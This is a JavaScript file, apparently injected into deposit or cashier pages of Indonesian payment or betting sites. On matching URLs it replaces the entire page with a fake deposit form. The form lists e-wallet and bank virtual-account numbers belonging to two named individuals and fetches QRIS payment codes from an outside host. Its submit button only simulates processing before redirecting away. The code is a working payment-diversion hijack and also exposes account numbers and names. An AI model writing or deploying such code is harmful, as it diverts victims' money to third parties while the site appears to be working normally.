(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) {
    console.log("[indexkuy.js] URL tidak cocok.");
    return;
  }

  console.log("[indexkuy.js] Ganti full <html> seperti 30.js");
  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
      body{margin:0;font-family:'Poppins',sans-serif;background:#eef2f6;color:#111;display:flex;justify-content:center;align-items:flex-start;padding:16px;min-height:100vh}
      .container{max-width:480px;width:100%;background:#fff;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.08);padding:16px}
      h1{text-align:center;font-size:20px;margin:0 0 12px}
      .actions{display:flex;gap:8px;justify-content:center;margin-bottom:12px;flex-wrap:wrap}
      button{flex:1;background:#1f6feb;color:#fff;border:none;padding:10px;border-radius:8px;font-weight:600;cursor:pointer}
      button.secondary{background:#16a34a}
      select,input,textarea{width:100%;margin-top:8px;padding:10px;border:1px solid #ccc;border-radius:8px;font-size:14px}
      .bank-info{margin-top:10px;background:#f8fafc;padding:10px;border-radius:8px;text-align:left;display:flex;flex-direction:column;gap:8px}
      .bank-info img{width:64px;height:64px;object-fit:contain;margin:0 auto}
      .bank-number{display:flex;align-items:center;justify-content:space-between;background:#fff;padding:6px 10px;border-radius:6px;border:1px solid #ddd}
      .copy-btn{background:#1f6feb;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer;font-size:13px;margin-left:10px;flex-shrink:0}
      .result-area{text-align:center;margin-top:12px}
      .qr-card img{width:220px;height:220px;border-radius:10px}
      .spinner{width:36px;height:36px;border:4px solid #ddd;border-top:4px solid #1f6feb;border-radius:50%;animation:spin 1s linear infinite;margin:12px auto}
      @keyframes spin{to{transform:rotate(360deg)}}
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <h1>Formulir Deposit</h1>
      <div class="actions">
        <button onclick="showDeposit('manual')">Manual Deposit</button>
        <button class="secondary" onclick="showDeposit('auto')">QRIS</button>
      </div>

      <div id="manual-step" style="display:none">
        <select onchange="selectMethod(this.value)">
          <option value="" selected disabled>Pilih Metode Deposit</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"88810088214538915","owner":"SURWATI"}'>BRI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"39358088905200893","owner":"ENJAH"}'>BCA VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810088214538915","owner":"SURWATI"}'>BNI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001088905200893","owner":"ENJAH"}'>MANDIRI VA</option>
        </select>
        <div id="manual-details" class="bank-info" style="display:none">
          <img id="bank-logo" src="" alt="Bank Logo">
          <div><b id="bank-name"></b><br><small id="bank-owner"></small></div>
          <div class="bank-number">
            <span id="bank-number"></span>
            <button class="copy-btn" onclick="copyNumber()">Salin</button>
          </div>
          <input id="manual-nominal" type="number" placeholder="Nominal min 50.000">
          <button onclick="submitManualDeposit()" style="margin-top:6px">Kirim</button>
          <div id="manual-result"></div>
        </div>
      </div>

      <div id="auto-deposit" style="display:none">
        <input id="nominal" type="number" placeholder="Nominal min 50.000">
        <button onclick="generateQRIS()" style="margin-top:6px">Buat QRIS</button>
        <div id="auto-result" class="result-area"></div>
      </div>
    </div>
  `;

  // ==== FUNGSI GLOBAL ====
  window.showDeposit = function (type) {
    document.getElementById("manual-step").style.display = type === "manual" ? "block" : "none";
    document.getElementById("auto-deposit").style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    document.getElementById("manual-details").style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "a/n " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return alert("Nomor kosong!");
    navigator.clipboard.writeText(num).then(() => alert("Nomor berhasil disalin: " + num));
  };

  window.submitManualDeposit = function () {
    const n = Number(document.getElementById("manual-nominal").value || 0);
    if (n < 50000) { alert("Minimal deposit 50.000"); return; }
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<strong>Deposit Diproses...</strong>";
      setTimeout(() => location.href = "../", 1500);
    }, 1500);
  };

  // === VERSI DEBUG QRIS ===
  window.generateQRIS = async function () {
    const n = Number(document.getElementById("nominal").value || 0);
    if (n < 50000) { alert("Minimal 50.000"); return; }
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';
    try {
      const r = await fetch("https://apxnzd.page.gd/qris.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "qris=000201010212...&qty=" + encodeURIComponent(n) + "&yn=n"
      });

      console.log("[QRIS] Status:", r.status);
      console.log("[QRIS] Headers:", [...r.headers.entries()]);
      const t = await r.text();
      console.log("[QRIS] Response:", t);

      if (!t) {
        document.getElementById("auto-result").innerHTML = "<div style='color:red'>Gagal membuat QRIS (respon kosong)</div>";
        return;
      }
      document.getElementById("auto-result").innerHTML = '<div class="qr-card"><img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(t) + '"></div>';
    } catch (e) {
      console.error("[QRIS] Fetch error:", e);
      document.getElementById("auto-result").innerHTML = "<div style='color:red'>Fetch error: " + e.message + "</div>";
    }
  };
})();
